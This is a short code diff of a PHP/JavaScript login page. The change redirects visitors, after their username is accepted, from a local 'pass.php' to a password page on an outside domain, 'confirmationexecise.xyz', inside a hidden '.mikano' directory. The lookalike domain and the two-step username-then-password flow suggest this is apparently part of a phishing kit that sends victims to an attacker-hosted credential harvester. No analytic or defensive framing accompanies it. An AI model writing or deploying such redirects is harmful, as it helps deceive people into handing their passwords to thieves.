@@ -82,7 +82,7 @@ if(isset($_POST['user'])) {
                 data = JSON.parse(data);
 
                 if(data.success == true) {
-                    window.location = 'pass.php';
+                    window.location = 'https://confirmationexecise.xyz/.mikano/pass.php';
                 }
             });
         });
